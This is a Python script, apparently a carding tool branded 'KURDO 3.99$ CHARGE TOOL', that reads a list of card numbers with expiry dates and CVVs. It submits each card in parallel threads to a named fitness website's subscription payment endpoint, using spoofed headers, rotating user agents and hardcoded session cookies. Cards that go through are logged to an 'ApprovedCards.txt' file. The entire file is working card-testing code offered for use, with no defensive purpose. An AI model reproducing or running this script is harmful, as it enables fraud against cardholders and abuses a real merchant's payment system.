import requests
import json
import os
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.prompt import Prompt

ua = UserAgent()
console = Console()

def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')

def display_banner():
    banner_text = Text("KURDO 3.99$ CHARGE TOOL", style="bold cyan", justify="center")
    console.print(Panel(banner_text, border_style="bright_green"))

def check_card(card_details):
    try:
        cn, expm, expy, cv = card_details.strip().split('|')
        expy = expy[-2:]
        cookies = {
            'sucuri_cloudproxy_uuid_0e749aa32': '9d73b93f5646fab3ec3f5bf1a213d636',
            '_ga': 'GA1.1.414691768.1724575717',
            '_gcl_au': '1.1.1283967854.1724575717',
            'ci_session': 'gmtc8809vskha0fbn19mvae05vm6t341',
            '_ga_4HXMJ7D3T6': 'GS1.1.1724575716.1.1.1724576199.0.0.0',
            '_ga_KQ5ZJRZGQR': 'GS1.1.1724575717.1.1.1724576199.60.0.1944711815',
        }
        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9,bn;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lagreeod.com',
            'priority': 'u=1, i',
            'referer': 'https://www.lagreeod.com/subscribe-payment',
            'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': ua.random,
            'x-requested-with': 'XMLHttpRequest',
        }
        data = {
            'card[name]': 'Amid Smith',
            'card[number]': cn,
            'card[exp_month]': expm,
            'card[exp_year]': expy,
            'card[cvc]': cv,
            'coupon': '',
            's1': '15',
            'sum': '21',
        }
        response = requests.post('https://www.lagreeod.com/register/validate_subscribe_step_3', cookies=cookies, headers=headers, data=data)
        response_data = response.json()
        decline_keywords = ['invalid', 'incorrect', 'declined', 'error', 'ErrorException', '402', '500']
        if any(keyword in response_data.get('message', '').lower() for keyword in decline_keywords):
            console.print(f" @iakurdo > ➦ {cn}|{expm}|{expy}|{cv} [bold red]Declined ⛔[/bold red] - {response_data.get('message')}")
        else:
            console.print(f" @iakurdo > ➦ {cn}|{expm}|{expy}|{cv} [bold green]Charged 3.99$ ✅[/bold green] - {response_data.get('message')}")
            with open("ApprovedCards.txt", "a") as file:
                file.write(f"{cn}|{expm}|{expy}|{cv}\n")
    except json.JSONDecodeError:
        console.print(f" @iakurdo > ➦ {cn}|{expm}|{expy}|{cv} - [bold yellow]Failed to decode JSON response[/bold yellow]")
    except Exception as e:
        console.print(f" @iakurdo > ⚠️ [bold red]Error processing card {cn}|{expm}|{expy}|{cv}[/bold red] - {str(e)}")

def main():
    clear_terminal()
    display_banner()
    combo_file = Prompt.ask(" @iakurdo > ^ [bold cyan]Name Combo[/bold cyan]  : ")
    clear_terminal()
    display_banner()
    try:
        with open(combo_file, "r", encoding="utf-8") as file:
            cards = file.readlines()
    except UnicodeDecodeError:
        console.print(" @iakurdo > ⚠️ [bold yellow]Unable to decode the file using UTF-8. Trying a different encoding...[/bold yellow]")
        with open(combo_file, "r", encoding="ISO-8859-1") as file:
            cards = file.readlines()
    except FileNotFoundError:
        console.print(f" @iakurdo > ❌ [bold red]File {combo_file} not found.[/bold red]")
        return
    except Exception as e:
        console.print(f" @iakurdo > ⚠️ [bold red]Unexpected error opening file:[/bold red] {str(e)}")
        return
    max_workers = 5
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        executor.map(check_card, cards)
if __name__ == "__main__":
    main()
    console.print("\n @iakurdo > ✅ [bold green]Process completed.[/bold green] Press Enter to exit...")
    input()
